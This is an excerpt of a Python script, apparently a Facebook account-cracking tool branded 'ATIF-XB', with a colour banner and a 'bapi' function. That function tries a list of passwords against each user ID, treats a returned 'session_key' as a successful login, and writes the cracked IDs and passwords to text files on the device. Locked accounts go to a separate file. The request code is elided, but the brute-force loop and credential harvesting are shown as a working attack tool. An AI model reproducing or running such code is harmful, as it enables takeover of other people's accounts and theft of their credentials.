...
def logo():
    ...
    print(f"""{white}
             ...
             █▀█ ░█░ █ █▀░
                                      {green}(AATU){white}  """)                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner       : ATIF SHAR ")
    print(f" {white}{green}[~]{white} Facebook  : ATIF SHAR")
    print(f" {white}{green}[~]{white} WRITTEN by : AHMED ")
...
def infinty():
    ...
    print(f'{rad} ONLY FOR PERSONAL USE !{white} ')
    print(50*'-')
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}ATIF-XB{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{green}[ATIF-OK] {uidX} | {pw} {white}')
                    open('/sdcard/ATIF-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[ATIF-OK] {uid} | {pw} {white}')
                    open('/sdcard/ATIF-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r{rad}[ATIF-OK⭐] {uid}     | {pw} {white}')
                    open('/sdcard/ATIF-OK⭐.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uidX)
            else:continue
        cracked.append(uid)
